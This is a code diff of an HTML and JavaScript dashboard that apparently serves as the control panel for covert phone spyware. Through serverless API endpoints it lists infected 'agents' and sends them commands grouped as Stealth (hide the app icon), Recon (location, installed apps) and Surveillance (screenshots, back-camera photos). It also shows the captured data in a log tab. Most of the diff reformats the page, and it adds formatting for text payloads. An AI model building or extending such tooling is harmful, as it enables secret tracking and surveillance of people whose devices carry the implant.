@@ -9,56 +9,32 @@
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto+Mono:wght@400;600&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg-primary: #0a0c10;
-            --bg-secondary: #161b22;
-            --border-color: #2a313c;
-            --text-primary: #e6edf3;
-            --text-secondary: #7d8590;
-            --accent-cyan: #00ffff;
-            --glow-cyan: rgba(0, 255, 255, 0.4);
-            --success: #28a745;
-            --error: #dc3545;
-            --font-display: 'Orbitron', sans-serif;
-            --font-mono: 'Roboto Mono', monospace;
+            --bg-primary: #0a0c10; --bg-secondary: #161b22; --border-color: #2a313c;
+            --text-primary: #e6edf3; --text-secondary: #7d8590; --accent-cyan: #00ffff;
+            --glow-cyan: rgba(0, 255, 255, 0.4); --success: #28a745; --error: #dc3545;
+            --font-display: 'Orbitron', sans-serif; --font-mono: 'Roboto Mono', monospace;
         }
         * { box-sizing: border-box; }
         body {
-            font-family: var(--font-mono);
-            background-color: var(--bg-primary);
-            color: var(--text-primary);
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
+            font-family: var(--font-mono); background-color: var(--bg-primary); color: var(--text-primary);
+            margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px;
         }
         .dashboard-container {
-            width: 100%;
-            max-width: 700px;
-            background-color: var(--bg-secondary);
-            border-radius: 12px;
-            border: 1px solid var(--border-color);
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
-            overflow: hidden;
-            animation: fadeIn 1s ease-in-out;
+            width: 100%; max-width: 700px; background-color: var(--bg-secondary); border-radius: 12px;
+            border: 1px solid var(--border-color); box-shadow: 0 0 30px rgba(0, 0, 0, 0.5);
+            overflow: hidden; animation: fadeIn 1s ease-in-out;
         }
         @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
         .card-header {
-            padding: 24px 32px;
-            text-align: center;
-            font-family: var(--font-display);
-            font-size: 1.5em;
-            color: var(--accent-cyan);
-            text-shadow: 0 0 10px var(--glow-cyan);
-            border-bottom: 1px solid var(--border-color);
-            letter-spacing: 2px;
+            padding: 24px 32px; text-align: center; font-family: var(--font-display); font-size: 1.5em;
+            color: var(--accent-cyan); text-shadow: 0 0 10px var(--glow-cyan);
+            border-bottom: 1px solid var(--border-color); letter-spacing: 2px;
         }
         .card-body { padding: 32px; }
         .tabs { display: flex; border-bottom: 1px solid var(--border-color); margin-bottom: 24px; }
         .tab-button {
-            padding: 14px 22px; cursor: pointer; background: none; border: none;
-            color: var(--text-secondary); font-size: 1em; font-weight: 600; font-family: var(--font-mono);
+            padding: 14px 22px; cursor: pointer; background: none; border: none; color: var(--text-secondary);
+            font-size: 1em; font-weight: 600; font-family: var(--font-mono);
             border-bottom: 3px solid transparent; transition: all 0.2s ease;
         }
         .tab-button:hover { color: var(--text-primary); }
@@ -69,16 +45,14 @@
         .form-group { margin-bottom: 24px; }
         .form-group label { display: block; margin-bottom: 10px; font-weight: 600; color: var(--text-secondary); }
         select {
-            width: 100%; padding: 14px; background-color: var(--bg-primary);
-            border: 1px solid var(--border-color); border-radius: 8px;
-            color: var(--text-primary); font-size: 1em; font-family: var(--font-mono);
+            width: 100%; padding: 14px; background-color: var(--bg-primary); border: 1px solid var(--border-color);
+            border-radius: 8px; color: var(--text-primary); font-size: 1em; font-family: var(--font-mono);
         }
         select:focus { outline: none; border-color: var(--accent-cyan); box-shadow: 0 0 10px var(--glow-cyan); }
         button#btnTransmit {
             width: 100%; padding: 16px; background: linear-gradient(90deg, #00c3ff, #007bff);
-            border: none; border-radius: 8px; color: white; font-size: 1.1em;
-            font-weight: 600; cursor: pointer; transition: all 0.3s ease;
-            box-shadow: 0 0 15px var(--glow-cyan);
+            border: none; border-radius: 8px; color: white; font-size: 1.1em; font-weight: 600;
+            cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 15px var(--glow-cyan);
         }
         button#btnTransmit:hover { transform: scale(1.02); box-shadow: 0 0 25px var(--glow-cyan); }
         #data-log-output {
@@ -104,43 +78,17 @@
                 <button class="tab-button active" data-tab="control">CONTROL</button>
                 <button class="tab-button" data-tab="datalog">DATA LOG</button>
             </nav>
-
             <div id="control" class="tab-content active">
-                 <div class="form-group">
-                    <label for="selectDevice">SELECT AGENT</label>
-                    <select id="selectDevice"><option>-- Searching for Agents --</option></select>
-                </div>
-                <div class="form-group">
-                    <label for="selectCommand">SELECT COMMAND</label>
-                    <select id="selectCommand">
-                        <optgroup label="Stealth">
-                            <option value="toggle_icon_hide">Hide App Icon</option>
-                            <option value="toggle_icon_show">Show App Icon</option>
-                        </optgroup>
-                        <optgroup label="Recon">
-                            <option value="get_location">Get Location</option>
-                            <option value="list_apps">List Installed Apps</option>
-                        </optgroup>
-                        <optgroup label="Surveillance">
-                            <option value="screenshot">Take Screenshot</option>
-                            <option value="picture_back">Take Picture (Back Camera)</option>
-                        </optgroup>
-                    </select>
-                </div>
+                <div class="form-group"><label for="selectDevice">SELECT AGENT</label><select id="selectDevice"><option>-- Searching... --</option></select></div>
+                <div class="form-group"><label for="selectCommand">SELECT COMMAND</label><select id="selectCommand"><optgroup label="Stealth"><option value="toggle_icon_hide">Hide App Icon</option><option value="toggle_icon_show">Show App Icon</option></optgroup><optgroup label="Recon"><option value="get_location">Get Location</option><option value="list_apps">List Installed Apps</option></optgroup><optgroup label="Surveillance"><option value="screenshot">Take Screenshot</option><option value="picture_back">Take Picture (Back Camera)</option></optgroup></select></div>
                 <button id="btnTransmit">TRANSMIT</button>
             </div>
-
             <div id="datalog" class="tab-content">
-                 <div class="form-group">
-                    <label>INCOMING DATA</label>
-                    <div id="data-log-output">Awaiting data packets...</div>
-                </div>
+                <div class="form-group"><label>INCOMING DATA</label><div id="data-log-output">Awaiting data packets...</div></div>
             </div>
-            
             <div id="statusBar" class="status-bar status-idle">SYSTEM IDLE</div>
         </div>
     </div>
-
     <script>
         const selectDevice = document.getElementById('selectDevice');
         const selectCommand = document.getElementById('selectCommand');
@@ -149,21 +97,15 @@
         const dataLogOutput = document.getElementById('data-log-output');
         const tabs = document.querySelectorAll('.tab-button');
         const tabContents = document.querySelectorAll('.tab-content');
-
         const API_BASE = '/.netlify/functions';
         let devices = [];
 
-        function setStatus(message, type) {
-            statusBar.textContent = message;
-            statusBar.className = `status-bar status-${type}`;
-        }
+        function setStatus(message, type) { statusBar.textContent = message; statusBar.className = `status-bar status-${type}`; }
         
         tabs.forEach(tab => {
             tab.addEventListener('click', () => {
-                tabs.forEach(t => t.classList.remove('active'));
-                tab.classList.add('active');
-                tabContents.forEach(c => c.classList.remove('active'));
-                document.getElementById(tab.dataset.tab).classList.add('active');
+                tabs.forEach(t => t.classList.remove('active')); tab.classList.add('active');
+                tabContents.forEach(c => c.classList.remove('active')); document.getElementById(tab.dataset.tab).classList.add('active');
             });
         });
 
@@ -172,85 +114,49 @@
                 const response = await fetch(`${API_BASE}/get-devices`);
                 if (!response.ok) throw new Error(`Server ${response.status}`);
                 devices = await response.json();
-                
                 selectDevice.innerHTML = '<option value="" disabled selected>-- Select an Agent --</option>';
-                if (devices.length === 0) {
-                    selectDevice.innerHTML = '<option value="" disabled selected>-- No Agents Found --</option>';
-                } else {
-                    devices.forEach(device => {
-                        const option = document.createElement('option');
-                        option.value = device.token;
-                        option.textContent = device.deviceId;
-                        selectDevice.appendChild(option);
-                    });
-                }
-            } catch (error) {
-                setStatus(`Error fetching agents`, 'error');
-                selectDevice.innerHTML = '<option value="" disabled selected>-- Error --</option>';
-            }
+                if (devices.length === 0) { selectDevice.innerHTML = '<option value="" disabled selected>-- No Agents Found --</option>'; }
+                else { devices.forEach(device => { const option = document.createElement('option'); option.value = device.token; option.textContent = device.deviceId; selectDevice.appendChild(option); }); }
+            } catch (error) { setStatus(`Error fetching agents`, 'error'); selectDevice.innerHTML = '<option value="" disabled selected>-- Error --</option>'; }
         }
 
         async function transmitCommand() {
-            const token = selectDevice.value;
-            const commandValue = selectCommand.value;
-
-            if (!token || !commandValue) {
-                return setStatus('Agent and Command must be selected.', 'error');
-            }
-
-            let action;
-            let payload = {};
-
-            if (commandValue.startsWith('toggle_icon')) {
-                action = 'toggle_icon';
-                payload.show = commandValue.endsWith('show') ? 'true' : 'false';
-            } else if (commandValue === 'picture_back') {
-                action = 'picture';
-                payload.camera_id = '0';
-            } else {
-                action = commandValue;
-            }
-            
+            const token = selectDevice.value; const commandValue = selectCommand.value;
+            if (!token || !commandValue) { return setStatus('Agent and Command must be selected.', 'error'); }
+            let action; let payload = {};
+            if (commandValue.startsWith('toggle_icon')) { action = 'toggle_icon'; payload.show = commandValue.endsWith('show') ? 'true' : 'false'; }
+            else if (commandValue === 'picture_back') { action = 'picture'; payload.camera_id = '0'; }
+            else { action = commandValue; }
             setStatus('Transmitting...', 'sending');
-            
             try {
-                const response = await fetch(`${API_BASE}/send-command`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ token, action, ...payload })
-                });
-
+                const response = await fetch(`${API_BASE}/send-command`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token, action, ...payload }) });
                 const result = await response.json();
                 if (!response.ok) throw new Error(result.error || `Server ${response.status}`);
-                
                 setStatus(`[${action}] signal transmitted successfully.`, 'success');
-                setTimeout(fetchDeviceData, 3000); // Fetch data after a delay
-
-            } catch (error) {
-                setStatus(`Transmission failed: ${error.message}`, 'error');
-            }
+                setTimeout(fetchDeviceData, 3000);
+            } catch (error) { setStatus(`Transmission failed: ${error.message}`, 'error'); }
         }
 
         async function fetchDeviceData() {
-            const token = selectDevice.value;
-            if(!token) return;
-            const device = devices.find(d => d.token === token);
-            if(!device) return;
-
-            setStatus('Querying for data packets...', 'sending');
-            document.querySelector('.tab-button[data-tab="datalog"]').click(); // Switch to log tab
-
+            const token = selectDevice.value; if(!token) return; const device = devices.find(d => d.token === token); if(!device) return;
+            setStatus('Querying for data packets...', 'sending'); document.querySelector('.tab-button[data-tab="datalog"]').click();
             try {
                 const response = await fetch(`${API_BASE}/get-device-data?deviceId=${device.deviceId}`);
                 if (!response.ok) throw new Error(`Server ${response.status}`);
                 const data = await response.json();
-
                 if(data.length > 0) {
-                    dataLogOutput.innerHTML = ''; // Clear previous logs for this device
+                    dataLogOutput.innerHTML = '';
                     data.forEach(item => {
                         const logEntry = document.createElement('div');
-                        const payload = JSON.stringify(item.payload, null, 2);
-                        logEntry.innerHTML = `<strong>[${item.dataType.toUpperCase()}]</strong> - ${new Date(item.timestamp).toLocaleString()}\n${payload}\n\n`;
+                        let payloadContent;
+                        // --- NEW: Data Formatting Logic ---
+                        if (typeof item.payload === 'string') {
+                            payloadContent = item.payload.replace(/\\n/g, '\n');
+                        } else {
+                            payloadContent = JSON.stringify(item.payload, null, 2);
+                        }
+                        // --- End of New Logic ---
+                        logEntry.innerHTML = `<strong>[${item.dataType.toUpperCase()}]</strong> - ${new Date(item.timestamp).toLocaleString()}\n<pre>${payloadContent}</pre><hr style="border-color: var(--border-color); margin: 10px 0;">`;
                         dataLogOutput.appendChild(logEntry);
                     });
                      setStatus(`Received ${data.length} data packets.`, 'success');
@@ -258,9 +164,7 @@
                     dataLogOutput.textContent = 'No data logs found for this agent.';
                     setStatus('Query complete. No new data.', 'idle');
                 }
-            } catch (error) {
-                 setStatus(`Failed to fetch data: ${error.message}`, 'error');
-            }
+            } catch (error) { setStatus(`Failed to fetch data: ${error.message}`, 'error'); }
         }
 
         btnTransmit.addEventListener('click', transmitCommand);
